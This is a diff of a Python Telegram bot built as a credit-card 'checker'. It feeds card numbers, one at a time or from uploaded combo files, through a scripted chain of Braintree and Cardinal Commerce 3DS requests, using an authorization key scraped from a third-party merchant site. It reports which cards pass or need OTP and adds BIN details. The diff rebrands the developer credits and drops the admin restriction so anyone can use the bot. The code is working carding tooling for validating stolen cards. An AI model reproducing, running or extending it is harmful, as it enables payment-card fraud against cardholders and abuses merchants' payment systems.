@@ -1,37 +1,28 @@
 import telebot
 import time
-import threading
-import cloudscraper
+import threading, cloudscraper
 from telebot import types
-import requests
-import random
-import os
-import pickle
-import re
+import requests, random, os, pickle, re
 from bs4 import BeautifulSoup
 import uuid
 from urllib.parse import urlencode
+from random import choice, choices
+import string
 import base64
+from faker import Faker
+import faker
 import json
 import jwt
-from datetime import datetime
+from user_agent import generate_user_agent
 
-# توليد وكيل مستخدم عشوائي
-def generate_user_agent():
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
-    ]
-    return random.choice(user_agents)
+# Get token from environment variable
+token = os.environ.get('TG_BOT_VISA')
+if not token:
+    raise ValueError("TG_BOT_VISA environment variable not set")
 
-# توكن البوت - يجب تحديثه بالتوكن الصحيح
-token = os.getenv("TG_BOT_VISA")
 bot = telebot.TeleBot(token, parse_mode="HTML")
 
-# متغيرات عامة
+# Remove admin restrictions - make it work for everyone
 stop = {}
 user_gateways = {}
 stop_flags = {} 
@@ -48,7 +39,7 @@ def handle_start(message):
     name = message.from_user.first_name
     bot.edit_message_text(chat_id=message.chat.id,
                           message_id=sent_message.message_id,
-                          text=f"Hi {name}, Welcome To Saoud Checker (Stripe Auth)",
+                          text=f"Hi {name}, Welcome To Bassl Checker (Otp and Passed)",
                           reply_markup=mes)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'start')
@@ -56,14 +47,7 @@ def handle_start_button(call):
     name = call.from_user.first_name
 
     bot.send_message(call.message.chat.id, 
-        '''- مرحباً بك في بوت فحص OTP And Passed ✅
-
-
-للفحص اليدوي(OTP) [/otp] و للكومبو فقط ارسل الملف.
-
-للفحص اليدوي(Passed) [/vbv] و للكومبو فقط ارسل الملف.
-
-اختر نوع الفحص وسيبدأ البوت بأعطائك افضل النتائج مع علاوي الاسطوره @B11HB''')
+        ' - مرحباً بك في بوت فحص Otp And Passed ✅\n\n\nللفحص اليدوي(OTP) [/otp] و للكومبو فقط ارسل الملف.\n\nللفحص اليدوي(Passed) [/vbv] و للكومبو فقط ارسل الملف.\n\nاختر نوع الفحص وسيبدأ البوت بأعطائك البطاقات المفحوصة يوزر المطور @iazuh)')
 
     bot.edit_message_text(chat_id=call.message.chat.id,
                           message_id=call.message.message_id,
@@ -76,9 +60,8 @@ def UniversalStripeChecker(ccx):
     mm = ccx.split("|")[1]
     yy = ccx.split("|")[2]
     cvc = ccx.split("|")[3]
-    if "20" in yy:
+    if "20" in yy:  # Mo3gza
         yy = yy.split("20")[1]
-    
     user = generate_user_agent()
     r = requests.Session()
     headers = {
@@ -98,17 +81,12 @@ def UniversalStripeChecker(ccx):
         'upgrade-insecure-requests': '1',
         'user-agent': user,
     }
-
-    try:
-        response = r.get('https://adresilo.com/', headers=headers)
-        js = response.text
-        mi = re.search(r'authorization\s*:\s*["\']([^"\']+)["\']', js, re.IGNORECASE).group(1)
-        dec = base64.b64decode(mi).decode('utf-8')
-        au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
-    except Exception as e:
-        print(f"Error in getting authorization: {e}")
-        return "Error: Could not get authorization"
-
+    
+    response = r.get('https://adresilo.com/', headers=headers)
+    js = response.text
+    mi = re.search(r'authorization\s*:\s*["\']([^"\']+)["\']', js, re.IGNORECASE).group(1)
+    dec = base64.b64decode(mi).decode('utf-8')
+    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
     headers = {
         'authority': 'payments.braintree-api.com',
         'accept': '*/*',
@@ -128,7 +106,7 @@ def UniversalStripeChecker(ccx):
         'sec-fetch-site': 'cross-site',
         'user-agent': user,
     }
-
+    
     json_data = {
         'clientSdkMetadata': {
             'source': 'client',
@@ -138,14 +116,10 @@ def UniversalStripeChecker(ccx):
         'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
         'operationName': 'ClientConfiguration',
     }
-
-    try:
-        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-        car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
-    except Exception as e:
-        print(f"Error in getting cardinal authentication: {e}")
-        return "Error: Could not get cardinal authentication"
-
+    
+    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+    car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
+    
     headers = {
         'authority': 'centinelapi.cardinalcommerce.com',
         'accept': '*/*',
@@ -164,7 +138,7 @@ def UniversalStripeChecker(ccx):
         'user-agent': user,
         'x-cardinal-tid': 'Tid-e8eb7f4d-e856-412f-a52a-acc189f415a7',
     }
-
+    
     json_data = {
         'BrowserPayload': {
             'Order': {
@@ -197,16 +171,12 @@ def UniversalStripeChecker(ccx):
         'ConsumerSessionId': '0_d43f49a0-0351-4474-9434-3359c0785314',
         'ServerJWT': car,
     }
-
-    try:
-        response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
-        payload = response.json()['CardinalJWT']
-        ali2 = jwt.decode(payload, options={"verify_signature": False})
-        reid = ali2['ReferenceId']
-    except Exception as e:
-        print(f"Error in JWT initialization: {e}")
-        return "Error: JWT initialization failed"
-
+    
+    response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
+    payload = response.json()['CardinalJWT']
+    ali2 = jwt.decode(payload, options={"verify_signature": False})
+    reid = ali2['ReferenceId']
+    
     headers = {
         'authority': 'geo.cardinalcommerce.com',
         'accept': '*/*',
@@ -225,7 +195,7 @@ def UniversalStripeChecker(ccx):
         'user-agent': user,
         'x-requested-with': 'XMLHttpRequest',
     }
-
+    
     json_data = {
         'Cookies': {
             'Legacy': True,
@@ -283,18 +253,14 @@ def UniversalStripeChecker(ccx):
         },
         'BinSessionId': '9b64aec3-f1d0-4c4b-ab62-9dbfaedba6b9',
     }
-
-    try:
-        response = r.post(
-            'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
-            cookies=r.cookies,
-            headers=headers,
-            json=json_data,
-        )
-    except Exception as e:
-        print(f"Error in saving browser data: {e}")
-        return "Error: Could not save browser data"
-
+    
+    response = r.post(
+        'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
+        cookies=r.cookies,
+        headers=headers,
+        json=json_data,
+    )
+    
     headers = {
         'authority': 'payments.braintree-api.com',
         'accept': '*/*',
@@ -314,7 +280,7 @@ def UniversalStripeChecker(ccx):
         'sec-fetch-site': 'cross-site',
         'user-agent': user,
     }
-
+    
     json_data = {
         'clientSdkMetadata': {
             'source': 'client',
@@ -340,15 +306,11 @@ def UniversalStripeChecker(ccx):
         },
         'operationName': 'TokenizeCreditCard',
     }
-
-    try:
-        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-        tok = response.json()['data']['tokenizeCreditCard']['token']
-        binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
-    except Exception as e:
-        print(f"Error in tokenizing credit card: {e}")
-        return "Error: Could not tokenize credit card"
-
+    
+    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+    tok = response.json()['data']['tokenizeCreditCard']['token']
+    binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
+    
     headers = {
         'authority': 'api.braintreegateway.com',
         'accept': '*/*',
@@ -366,7 +328,7 @@ def UniversalStripeChecker(ccx):
         'sec-fetch-site': 'cross-site',
         'user-agent': user,
     }
-
+    
     email = f"usergchkppljvcx{random.randint(1000,9999)}@gmail.com"
     json_data = {
         'amount': '15.00',
@@ -404,26 +366,23 @@ def UniversalStripeChecker(ccx):
             'sessionId': '240c46d1-4a79-41dc-af5c-a4465479ebab',
         },
     }
-
-    try:
-        response = r.post(
-            f'https://api.braintreegateway.com/merchants/47n4hmzccvn4744j/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
-            headers=headers,
-            json=json_data,
-        )
-        msg = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
-    except Exception as e:
-        print(f"Error in 3D secure lookup: {e}")
-        return "Error: 3D secure lookup failed"
+    
+    response = r.post(
+        f'https://api.braintreegateway.com/merchants/47n4hmzccvn4744j/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
+        headers=headers,
+        json=json_data,
+    )
+    
+    msg = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
 
     if 'challenge_required' in msg:
         return '3DS Challenge Required'
     elif 'authenticate_attempt_successful' in msg:
         return '3DS Authenticate Attempt Successful'
     elif 'authenticate_frictionless_failed' in msg:
-        return '3DS Authenticate Frictionless Failed'                
-    elif 'authenticate_successful' in msg:                
-        return '3DS Authenticate Successful'                
+        return '3DS Authenticate Frictionless Failed'        
+    elif 'authenticate_successful' in msg:        
+        return '3DS Authenticate Successful'        
     else:
         return msg
 
@@ -447,9 +406,9 @@ def reg(cc):
             cvc = match[20:23]
     cc = f"{n}|{mm}|{yy}|{cvc}"
     if not re.match(r'^\d{16}$', n):
-        return None
+        return
     if not re.match(r'^\d{3,4}$', cvc):
-        return None
+        return
     return cc
 
 @bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
@@ -468,7 +427,7 @@ def my_ali4(message):
         time_diff = (current_time - command_usage[idt]['last_time']).seconds
         if time_diff < 10:
             bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
-            return        
+            return    
     ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
     try:
         cc = message.reply_to_message.text
@@ -483,11 +442,11 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
     start_time = time.time()
     try:
         command_usage[idt]['last_time'] = datetime.now()
-        last = str(UniversalStripeChecker(cc))
+        bran = UniversalStripeChecker
+        last = str(bran(cc))
     except Exception as e:
-        print(f"Error in checking card: {e}")
         last = 'Error'
-
+        
     end_time = time.time()
     execution_time = end_time - start_time
     msg = f'''<strong>#Brantree_LookUp_(Passed) 🔥 [/vbv]
@@ -499,9 +458,9 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
 {str(dato(cc[:6]))}
 - - - - - - - - - - - - - - - - - - - - - - -
 [<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
-[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>Ali Check</a> []
+[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
 - - - - - - - - - - - - - - - - - - - - - - -
-[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''
+[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''
 
     bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
 
@@ -521,7 +480,7 @@ def my_ali5(message):
         time_diff = (current_time - command_usage[idt]['last_time']).seconds
         if time_diff < 10:
             bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
-            return        
+            return    
     ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
     try:
         cc = message.reply_to_message.text
@@ -536,11 +495,11 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
     start_time = time.time()
     try:
         command_usage[idt]['last_time'] = datetime.now()
-        last = str(UniversalStripeChecker(cc))
+        bran = UniversalStripeChecker
+        last = str(bran(cc))
     except Exception as e:
-        print(f"Error in checking card: {e}")
         last = 'Error'
-
+        
     end_time = time.time()
     execution_time = end_time - start_time
     msg = f'''<strong>#Brantree_LookUp_(OTP) 🔥 [/otp]
@@ -552,9 +511,9 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
 {str(dato(cc[:6]))}
 - - - - - - - - - - - - - - - - - - - - - - -
 [<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
-[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>Ali Check</a> []
+[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
 - - - - - - - - - - - - - - - - - - - - - - -
-[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''
+[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''
 
     bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
 
@@ -585,7 +544,7 @@ def GTR(call):
         basl = 0
         tote = 0
         filename = f"com{user_id}.txt"
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- Please Wait Processing Your File ..")
+        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "- Please Wait Processing Your File ..")
         with open(filename, 'r') as file:
             lino = file.readlines()
             total = len(lino)
@@ -600,14 +559,16 @@ def GTR(call):
 Approved! : {passs}
 Declined! : {basl}
 Total! : {passs + basl} / {total}
-Dev! : @B11HB''')
+Dev! : @iazuh''')
+
                     return
 
                 try:
                     start_time = time.time()
-                    last = str(UniversalStripeChecker(cc))
+                    bran = UniversalStripeChecker
+                    last = str(bran(cc))
                 except Exception as e:
-                    print(f"Error in checking card: {e}")
+                    print(e)
                     last = "ERROR"
                 mes = types.InlineKeyboardMarkup(row_width=1)
                 cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
@@ -626,12 +587,12 @@ Dev! : @B11HB''')
 - Time: {execution_time:.2f}s''',
                     reply_markup=mes
                 )
-
+                    
                 n = cc.split("|")[0]
                 mm = cc.split("|")[1]
                 yy = cc.split("|")[2]
                 cvc = cc.split("|")[3].strip()
-
+                
                 cc = n+'|'+mm+'|'+yy+'|'+cvc
                 msg = f'''<strong>#Brantree_LookUp_(Passed) 🔥
 - - - - - - - - - - - - - - - - - - - - - - -
@@ -642,9 +603,9 @@ Dev! : @B11HB''')
 {str(dato(cc[:6]))}
 - - - - - - - - - - - - - - - - - - - - - - -
 [<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
-[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>Ali Check</a> []
+[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
 - - - - - - - - - - - - - - - - - - - - - - -
-[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''
+[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''
 
                 if '3DS Authenticate Successful' in last or '3DS Authenticate Attempt Successful' in last:
                     passs += 1
@@ -657,14 +618,23 @@ Dev! : @B11HB''')
             chat_id=call.message.chat.id, 
             message_id=call.message.message_id,
             text=f'''The Inspection Was Completed By Passed Pro. 🥳
-        
+    
 Approved!: {passs}
 Declined!: {basl}
 Total!: {passs + basl}
-Dev!: @B11HB''')
-
+Dev!: @iazuh''')
+                    
     my_thread = threading.Thread(target=my_ali)
-    my_thread.start()                                
+    my_thread.start()
+
+@bot.callback_query_handler(func=lambda call: call.data == 'stop')
+def menu_callback(call):
+    uid = str(call.from_user.id) 
+    stopuser.setdefault(uid, {})['status'] = 'stop'
+    try:
+        bot.answer_callback_query(call.id, "Stopped ✅")
+    except:
+        pass
 
 @bot.callback_query_handler(func=lambda call: call.data == 'ottpa3')
 def GTR2(call):
@@ -674,7 +644,7 @@ def GTR2(call):
         basli = 0
         tote = 0
         filename = f"com{user_id}.txt"
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- Please Wait Processing Your File ..")
+        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "- Please Wait Processing Your File ..")
         with open(filename, 'r') as file:
             lino = file.readlines()
             total = len(lino)
@@ -689,14 +659,16 @@ def GTR2(call):
 Approved! : {passsi}
 Declined! : {basli}
 Total! : {passsi + basli} / {total}
-Dev! : @B11HB''')
+Dev! : @iazuh''')
+
                     return
 
                 try:
                     start_time = time.time()
-                    last = str(UniversalStripeChecker(cc))
+                    bran = UniversalStripeChecker
+                    last = str(bran(cc))
                 except Exception as e:
-                    print(f"Error in checking card: {e}")
+                    print(e)
                     last = "ERROR"
                 mes = types.InlineKeyboardMarkup(row_width=1)
                 cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
@@ -715,12 +687,12 @@ Dev! : @B11HB''')
 - Time: {execution_time:.2f}s''',
                     reply_markup=mes
                 )
-
+                    
                 n = cc.split("|")[0]
                 mm = cc.split("|")[1]
                 yy = cc.split("|")[2]
                 cvc = cc.split("|")[3].strip()
-
+                
                 cc = n+'|'+mm+'|'+yy+'|'+cvc
                 msg = f'''<strong>#Brantree_LookUp_(OTP) 🔥
 - - - - - - - - - - - - - - - - - - - - - - -
@@ -731,9 +703,9 @@ Dev! : @B11HB''')
 {str(dato(cc[:6]))}
 - - - - - - - - - - - - - - - - - - - - - - -
 [<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
-[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>Ali Check</a> []
+[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
 - - - - - - - - - - - - - - - - - - - - - - -
-[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='tg://user?id=6052713305'>Alilwe</a> - 🍀</strong>'''
+[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''
 
                 if '3DS Challenge Required' in last:
                     passsi += 1
@@ -750,23 +722,14 @@ Dev! : @B11HB''')
 Approved!: {passsi}
 Declined!: {basli}
 Total!: {passsi + basli}
-Dev!: @B11HB''')
-
+Dev!: @iazuh''')
+                    
     my_thread = threading.Thread(target=my_ali2)
-    my_thread.start()                                
-
-@bot.callback_query_handler(func=lambda call: call.data == 'stop')
-def menu_callback(call):
-    uid = str(call.from_user.id) 
-    stopuser.setdefault(uid, {})['status'] = 'stop'
-    try:
-        bot.answer_callback_query(call.id, "Stopped ✅")
-    except:
-        pass
+    my_thread.start()
 
 def dato(zh):
     try:
-        api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
+        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
         brand = api_url["brand"]
         card_type = api_url["type"]
         level = api_url["level"]
@@ -778,7 +741,7 @@ def dato(zh):
 [<a href="https://t.me/l">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
         return mn
     except Exception as e:
-        print(f"Error in getting BIN info: {e}")
+        print(e)
         return 'No info'
 
 print('- Bot was run ..')
